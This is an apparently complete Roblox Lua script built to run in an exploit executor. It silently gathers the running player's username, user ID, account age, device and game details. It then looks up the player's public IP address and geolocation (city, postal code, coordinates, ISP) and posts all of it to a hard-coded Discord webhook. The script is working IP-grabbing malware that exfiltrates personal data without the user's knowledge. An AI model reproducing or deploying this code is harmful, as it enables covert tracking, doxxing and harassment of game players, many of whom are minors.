local webhookUrl = "https://discord.com/api/webhooks/1536016249610313828/0tIPjYApIp0oEaA0PEo9R_AMLgDfnalFZELeMW0JJWr8xhc3haxqs45J-Eq_ACJ65Y6a"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

if not RunService:IsClient() then
    warn("This script must run in a LocalScript on the client.")
    return
end

local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()

--========== BASIC PLAYER INFO ==========--
local username = LocalPlayer.Name
local displayName = LocalPlayer.DisplayName
local userId = LocalPlayer.UserId
local accountAge = LocalPlayer.AccountAge
local membershipType = tostring(LocalPlayer.MembershipType)
local localeId = LocalPlayer.LocaleId or "Unknown"
local locale = LocalPlayer.Locale or "Unknown"
local teamName = LocalPlayer.Team and LocalPlayer.Team.Name or "No Team"
local characterName = LocalPlayer.Character and LocalPlayer.Character.Name or "No Character"

--========== GAME INFO ==========--
local MarketplaceService = game:GetService("MarketplaceService")
local gameName = "Unknown"
local placeId = game.PlaceId
local jobId = game.JobId
local gameId = game.GameId
local placeVersion = game.PlaceVersion
local creatorId = game.CreatorId

local ok, gameInfo = pcall(function()
    return MarketplaceService:GetProductInfo(game.PlaceId)
end)
if ok and gameInfo then
    gameName = gameInfo.Name or gameName
end

--========== EXECUTOR ==========--
local executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"

--========== DEVICE ==========--
local device = "Unknown"
local UIS = game:GetService("UserInputService")
local platform = UIS:GetPlatform()

if UIS.TouchEnabled then
    device = "Mobile"
elseif UIS.KeyboardEnabled then
    device = "PC"
end

--========== EXECUTOR REQUEST WRAPPER ==========--
local requestFunction =
    (http_request or request or (http and http.request) or syn and syn.request)

if not requestFunction then
    warn("Your executor does not support HTTP requests.")
    return
end

local function sendWebhook(url, title)
    local json = HttpService:JSONEncode({
        embeds = {{
            ["title"] = title,
            ["description"] = string.format("**%s** triggered the script.", username),
            ["color"] = 16733525,
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            ["fields"] = {
                {
                    name = "Player Info",
                    value = string.format(
                        "**Username:** %s\n**Display Name:** %s\n**User ID:** %s\n**Account Age:** %s days\n**Premium:** %s\n**Locale:** %s (%s)\n**Team:** %s\n**Character:** %s",
                        username, displayName, userId, accountAge, membershipType, locale, localeId, teamName, characterName
                    ),
                    inline = false
                },
                {
                    name = "Game Info",
                    value = string.format(
                        "**Game:** %s\n**Game ID:** %s\n**Place ID:** %s\n**Place Version:** %s\n**Job ID:** %s\n**Creator ID:** %s",
                        gameName, gameId, placeId, placeVersion, jobId, creatorId
                    ),
                    inline = false
                },
                {
                    name = "Executor",
                    value = tostring(executor),
                    inline = true
                },
                {
                    name = "Device",
                    value = string.format(
                        "**Platform:** %s\n**Device:** %s\n**Touch:** %s\n**Keyboard:** %s\n**Mouse:** %s\n**Gamepad:** %s",
                        tostring(platform), tostring(device), tostring(UIS.TouchEnabled), tostring(UIS.KeyboardEnabled), tostring(UIS.MouseEnabled), tostring(UIS.GamepadEnabled)
                    ),
                    inline = true
                },
            },
            ["footer"] = {
                text = "Touchline SkidMtr",
            }
        }}
    })

    requestFunction({
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = json
    })
end

sendWebhook(webhookUrl, "Touchline SkidMtr.")
local name = game:GetService("Players").LocalPlayer.Name

if not requestFunction then
    warn("Your executor does not support HTTP requests.")
    return
end

-- Get IP
local getIPResponse = requestFunction({ Url = "https://api.ipify.org/?format=json", Method = "GET" })
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)

-- Get IP Info
local getIPInfo = requestFunction({ Url = string.format("http://ip-api.com/json/%s", IPBuffer), Method = "GET" })
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)

local FI = {
    IP = IPBuffer,
    query = IIT.query,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    timezone = IIT.timezone,
    asn = IIT.as,
    isp = IIT.isp,
    org = IIT.org
}

local dataMessage = string.format(
    "User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s",
    name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org
)

-- Embed with red color (16711680)
local MessageData = {
    ["embeds"] = {
        {
            ["title"] = "User Information",
            ["description"] = "Detailed IP and location data",
            ["color"] = 16733525,
            ["fields"] = {
                { name = "User", value = name, inline = true },
                { name = "IP", value = FI.IP, inline = true },
                { name = "ASN", value = FI.asn or "N/A", inline = true },
                { name = "Country", value = string.format("%s (%s)", FI.country, FI.countryCode), inline = true },
                { name = "Timezone", value = FI.timezone or "N/A", inline = true },
                { name = "Region", value = string.format("%s — %s", FI.regionName, FI.region), inline = true },
                { name = "City", value = FI.city, inline = true },
                { name = "Coordinates", value = string.format("%s, %s", FI.latitude or "N/A", FI.longitude or "N/A"), inline = true },
                { name = "Postal Code", value = FI.zipcode or "N/A", inline = true },
                { name = "ISP", value = FI.isp or "N/A", inline = false },
                { name = "Organization", value = FI.org or "N/A", inline = false },
                { name = "Lookup Query", value = FI.query or "N/A", inline = false }
            },
            ["footer"] = {
                text = "IP lookup provided by ip-api.com",
            }
        }
    }
}

-- Send to webhook
requestFunction({
    Url = webhookUrl,
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = game:GetService("HttpService"):JSONEncode(MessageData)
})   
